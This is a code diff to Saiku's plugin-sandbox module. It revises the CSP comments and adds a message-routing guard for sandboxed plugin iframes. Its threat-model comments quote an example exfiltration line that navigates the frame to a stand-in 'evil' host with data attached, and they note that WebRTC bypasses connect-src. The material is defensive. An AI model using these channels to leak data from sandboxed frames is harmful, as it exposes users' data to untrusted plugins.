@@ -136,18 +136,21 @@ export function handlePluginMessage(
  *   - connect-src 'none'     → blocks BACKGROUND subresource egress: fetch, XHR,
  *                              WebSocket, EventSource, sendBeacon
  *
- * IMPORTANT — what this does NOT stop. The CSP fetch directives above govern
- * SUBRESOURCE requests only. They do NOT govern navigation: a sandboxed frame
- * can always navigate ITSELF (e.g. `location = "https://evil/?d=" + data`), and
- * no CSP fetch directive covers that. So a plugin can still exfiltrate the data
- * shown in ITS OWN tile. The sandbox (allow-scripts, no allow-same-origin) still
- * fully isolates the Saiku origin — a plugin cannot read the parent DOM, cookies,
- * the session token, or any other-origin data — but the tile's own rows are not
- * confidential FROM the plugin. That is why plugins are ADMIN-INSTALLED trusted
- * code (like a server plugin JAR): an admin who installs a plugin trusts it with
- * the data that plugin's tile displays. Operators who want to close the
- * self-navigation channel too can set a restrictive `frame-src` at the page/proxy
- * layer via `saiku.security.csp`. See docs/APP-BUILDER-PLUGINS.md.
+ * IMPORTANT — what this does NOT stop. The fetch directives above govern
+ * SUBRESOURCE requests only, not the frame navigating ITSELF
+ * (`location = "https://evil/?d=" + data`). In the app that navigation is checked
+ * against the PARENT's policy instead: the shell enforces `default-src 'self'`
+ * (frame-src fallback, saiku#1917), so a cross-origin or data:/blob: target is
+ * refused; a same-origin target stays at the opaque origin. On the embed surface
+ * the third-party host page's policy decides. Channels no CSP directive governs
+ * remain (WebRTC: `connect-src` does not cover RTCPeerConnection in Chromium), so
+ * a plugin can still exfiltrate the data shown in ITS OWN tile. The sandbox
+ * (allow-scripts, no allow-same-origin) still isolates the Saiku origin — a plugin
+ * cannot read the parent DOM, cookies, the session token, or any other-origin
+ * data — but the tile's own rows are not confidential FROM the plugin. That is
+ * why plugins are ADMIN-INSTALLED trusted code (like a server plugin JAR): an
+ * admin who installs a plugin trusts it with the data that plugin's tile
+ * displays. See docs/APP-BUILDER-PLUGINS.md.
  */
 export const PLUGIN_CSP =
 	"default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'";
@@ -169,10 +172,13 @@ export const PLUGIN_FRAME_PATH = 'plugin-frame.html';
 /**
  * The enforced policy the plugin frame RESPONSE carries (saiku#2440). Mirrors
  * `SecurityHeadersFilter.PLUGIN_FRAME_CSP` (the launcher) and the dev/preview header in
- * vite.config.ts; the server appends `frame-ancestors` from its own configuration.
- *   - sandbox allow-scripts → even if the URL is opened top-level, the document runs at an
- *                             opaque origin with no forms/popups/top-navigation; the iframe's
- *                             own sandbox="allow-scripts" says the same
+ * vite.config.ts; the server appends `frame-ancestors` (the UI's configured value, always
+ * including 'self', since the frame's parent is the SPA).
+ *   - sandbox allow-scripts → the document runs at an opaque origin with no
+ *                             forms/popups/top-navigation even when loaded without the
+ *                             tile's sandboxed iframe (opened top-level, or framed with no
+ *                             sandbox attribute); the iframe's own sandbox="allow-scripts"
+ *                             says the same
  *   - the rest is {@link PLUGIN_CSP} plus base-uri / form-action 'none'.
  */
 export const PLUGIN_FRAME_CSP =
@@ -196,6 +202,40 @@ export const FRAME_LOAD_TYPE = 'saiku-plugin-load';
 export function isFrameBootMessage(raw: unknown, origin: string): boolean {
 	if (origin !== 'null' || !raw || typeof raw !== 'object') return false;
 	return (raw as Record<string, unknown>).type === FRAME_BOOT_TYPE;
+}
+
+/**
+ * Decide what the host does with one message event, for the tile whose frame window is
+ * `frame.window` (saiku#2440). The single place the host's guards live, so they are unit
+ * tested rather than inlined in the component:
+ *   1. `event.source` must be THIS tile's frame window. Every other window (other tiles, the
+ *      top window, injected frames, openers) is ignored. `event.origin` cannot authenticate a
+ *      plugin: an opaque frame's origin is "null".
+ *   2. A bootstrap boot message is answered only from an opaque ("null") origin, i.e. a frame
+ *      that really is sandboxed, and only with this tile's registry html (`pluginHtml`).
+ *   3. Everything else must pass {@link handlePluginMessage} (nonce + shape).
+ *
+ * The boot handshake itself is unauthenticated by design: whatever document sits in the tile's
+ * frame at an opaque origin may ask for the plugin document and its nonce. What keeps a foreign
+ * document out of that frame is the shell's enforced `default-src 'self'` (frame-src fallback,
+ * kit.config.js): an ancestor that navigates the tile frame elsewhere is refused. Never give
+ * the shell a frame-src wider than 'self' without revisiting this.
+ */
+export function routeFrameMessage(
+	event: { source: unknown; origin: string; data: unknown },
+	frame: { window: unknown; nonce: string; pluginHtml: string | null }
+):
+	| { kind: 'deliver'; message: { type: typeof FRAME_LOAD_TYPE; html: string } }
+	| { kind: 'plugin'; msg: NonNullable<ReturnType<typeof handlePluginMessage>> }
+	| null {
+	if (!frame.window || event.source !== frame.window) return null;
+	if (isFrameBootMessage(event.data, event.origin)) {
+		return frame.pluginHtml
+			? { kind: 'deliver', message: buildFrameLoadMessage(frame.pluginHtml, frame.nonce) }
+			: null;
+	}
+	const msg = handlePluginMessage(event.data, frame.nonce);
+	return msg ? { kind: 'plugin', msg } : null;
 }
 
 /** The host → bootstrap message carrying the full plugin document for this mount. */
